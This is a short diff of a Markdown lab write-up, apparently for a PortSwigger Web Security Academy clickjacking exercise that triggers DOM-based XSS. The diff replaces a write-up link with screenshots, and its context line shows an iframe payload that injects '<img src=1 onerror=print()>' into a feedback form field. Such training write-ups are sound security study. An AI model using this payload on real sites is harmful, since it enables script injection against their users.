@@ -56,7 +56,8 @@
 <iframe src="https://0ae2009c049304d684d6aa4b0065009d.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=pwned@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
 ```
 
----
+![Exploiting to Trigger DOM-Based XSS](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/csrf-lab14a.PNG)
 
-📖 **Write-Up:**  
-[Clickjacking - Exploiting to Trigger DOM-Based XSS](https://lnkd.in/equJv7iW)
+![Exploiting to Trigger DOM-Based XSS 2](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/csrf-lab14b.PNG)
+
+![Exploiting to Trigger DOM-Based XSS 3](https://github.com/LanZeroth/Portswigger-Writeups/blob/main/Images/csrf-lab14c.PNG) 
